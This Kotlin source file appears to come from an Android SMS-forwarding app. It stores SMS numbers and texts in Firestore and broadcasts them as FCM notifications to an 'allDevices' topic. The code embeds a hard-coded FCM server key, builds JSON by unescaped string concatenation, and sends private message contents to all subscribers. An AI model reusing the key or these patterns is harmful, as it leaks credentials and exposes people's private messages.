package com.rast.smsreader.firebase

import android.util.Log
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CompletableDeferred
import okhttp3.MediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import java.io.IOException


class SmsUpload {
    private val db = Firebase.firestore
    private val messaging = FirebaseMessaging.getInstance()

    suspend fun sendSms(smsNumber: String, smsData: String): Boolean{
        val date = System.currentTimeMillis().toString()
        val data = hashMapOf(
            "smsNumber" to smsNumber,
            "smsData" to smsData,
            "date" to date
        )

        val result = CompletableDeferred<Boolean>()
        db.collection("sms")
            .document(date)
            .set(data)
            .addOnCompleteListener {
            result.complete(it.isSuccessful)
        }

        return result.await()
    }

    fun sendNotification(smsNumber: String, smsData: String){


        // build OkHttpClient
        // build OkHttpClient
        val client = OkHttpClient()

// JSON body for FCM message

// JSON body for FCM message
        val jSON = MediaType.parse("application/json; charset=utf-8")
        val body: RequestBody = RequestBody.create(
            jSON, "{"
                    + "\"to\": \"/topics/allDevices\","
                    + "\"notification\": {"
                    + "\"title\": \"$smsNumber\","
                    + "\"body\": \"$smsData\""
                    + "}"
                    + "}"
        )

// FCM message request

// FCM message request
        val request: Request = Request.Builder()
            .url("https://fcm.googleapis.com/fcm/send")
            .post(body)
            .addHeader("Content-Type", "application/json")
            .addHeader("Authorization", "key=AAAALX4vQkA:APA91bGedm1In5UJMi8tqdCZ3LG-30UgDW2niY-eey4FFAA3_5KNA70ua5CHZMIaHsds_QyZOxEXqz2COs_WIZfcJo39gyfxJ9QNKmkbp9U7XEIJCEgJLFBOHWDpCA9iWVW00fX5aX7N")
            .build()

// make the request

// make the request
        try {
            client.newCall(request).execute().use { response ->
                Log.d(
                    "ttt",
                    "Sent message: " + response.body()?.string()
                )
            }
        } catch (e: IOException) {
            Log.e("ttt", "Failed to send message", e)
        }
    }
}